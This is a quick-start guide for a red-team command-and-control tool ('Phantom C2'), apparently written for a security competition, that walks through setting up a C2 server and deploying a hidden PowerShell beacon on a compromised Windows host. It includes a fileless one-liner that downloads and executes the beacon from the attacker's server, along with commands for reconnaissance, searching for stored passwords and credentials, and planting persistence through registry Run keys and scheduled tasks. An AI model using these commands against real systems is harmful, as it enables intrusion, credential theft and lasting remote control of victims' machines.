# Phantom C2 - Quick Start Guide

This guide gets you operational in 10 minutes.

## Prerequisites

- Red Team Linux machine (for C2 server)
- Compromised Windows target
- Python 3.8+ on Linux machine
- Network connectivity between target and C2 server

## Step 1: Start C2 Server (2 minutes)

```bash
# On your Red Team Linux box
cd server/
pip3 install flask cryptography
python3 c2_server.py
```

**Important:** CHANGE DEFAULT CREDENTIALS and Copy the Server Key displayed! You'll need it for the beacon.

```
[*] Server Key (hex): a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456
```

The dashboard is now accessible at `http://YOUR_IP:8080`

## Step 2: Configure Beacon (2 minutes)

Edit `implant/beacon.ps1`:

```powershell
param(
    [string]$ServerUrl = "http://192.168.100.50:8080",  # YOUR C2 IP
    [string]$ServerKey = "a1b2c3..."                     # KEY FROM STEP 1
)
```

Save the file.

## Step 3: Deploy Beacon to Target (1 minute)

**Option A: File-Based Deployment**

Transfer beacon.ps1 to target, then execute:

```powershell
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File beacon.ps1
```

**Option B: Memory-Based Deployment** (stealthier)

Host beacon.ps1 on your web server, then on target:

```powershell
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP/beacon.ps1')"
```

## Step 4: Verify Connection (1 minute)

1. Open dashboard: `http://YOUR_C2_IP:8080`
2. Enter credentials to login
2. Wait 30-60 seconds for first beacon check-in
3. You should see your beacon appear:

```
WEB-SERVER-01 (iisuser)
ID: f3a7b2c8 | IP: 10.0.1.15 | Last seen: 5 seconds ago
```

## Step 5: Execute Commands (1 minute)

1. Click on the beacon to select it
2. Type command in input box: `whoami`
3. Click EXECUTE or press Enter
4. Wait 30-60 seconds for result to appear

**Common First Commands:**

```powershell
whoami          # Current user
hostname        # Computer name
ipconfig        # Network info
systeminfo      # OS version and details
```

## Troubleshooting

### Beacon Doesn't Appear

**Check:**
- C2 server is running (`ps aux | grep c2_server`)
- Firewall allows port 8080
- Beacon configuration has correct IP and key
- Target can reach C2 server (`Test-NetConnection YOUR_IP -Port 8080`)

**Debug:**
Run beacon without `-WindowStyle Hidden` to see errors:
```powershell
powershell.exe -ExecutionPolicy Bypass -File beacon.ps1
```

### Commands Not Executing

**Check:**
- Beacon is showing "Last seen: X seconds ago" with recent time
- Command was queued (shows in dashboard after clicking EXECUTE)
- Wait full beacon interval (30-60 seconds)

### Encryption Errors

**Check:**
- Server key copied exactly (no typos)
- Key is full hex string (64 characters)
- beacon.ps1 has key in quotes: `"a1b2c3..."`

## Testing Without Windows Target

Use the test script:

```bash
cd tests/
python3 test_c2.py http://localhost:8080 YOUR_SERVER_KEY
```

This verifies server functionality without needing a real beacon.

## Competition Deployment Checklist

Before competition:
- [ ] Test C2 server on your attack box
- [ ] Test beacon on local Windows VM
- [ ] Copy server key to secure location
- [ ] Prepare beacon.ps1 with correct config
- [ ] Test file transfer mechanisms
- [ ] Verify dashboard accessible to team
- [ ] Test cleanup procedures

During competition:
- [ ] Start C2 server as soon as allowed
- [ ] Note server key somewhere secure
- [ ] Deploy beacons as targets are compromised
- [ ] Monitor dashboard for check-ins
- [ ] Document which beacons are on which systems

After competition:
- [ ] Send exit commands to all beacons
- [ ] Stop C2 server
- [ ] Clean up beacon files from targets
- [ ] Remove persistence mechanisms

## Quick Reference - Common Commands

### Reconnaissance
```powershell
whoami /all                    # User privileges
net user                       # Local users
net group /domain              # Domain groups
ipconfig /all                  # Full network config
route print                    # Routing table
arp -a                         # ARP cache
netstat -ano                   # Network connections
tasklist                       # Running processes
Get-Service                    # Windows services
Get-ScheduledTask              # Scheduled tasks
```

### File Operations
```powershell
dir C:\Users                   # List directory
Get-Content C:\file.txt        # Read file
Get-ChildItem -Recurse         # Recursive listing
```

### Credential Search
```powershell
Get-ChildItem C:\ -Recurse -Include *.txt,*.config,*.xml | Select-String -Pattern "password"
cmdkey /list                   # Stored credentials
```

### Persistence
```powershell
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Update" /t REG_SZ /d "cmd" /f
schtasks /create /sc minute /mo 30 /tn "Task" /tr "cmd"
```

## Support

- Full documentation: `README.md`
- Lab report: `docs/lab-report.md`
- Example output: `examples/example-output.txt`

**For competition questions, ask team lead or instructor.**

---

**Remember:** This tool is for authorized competition use only. Unauthorized use is illegal and unethical.
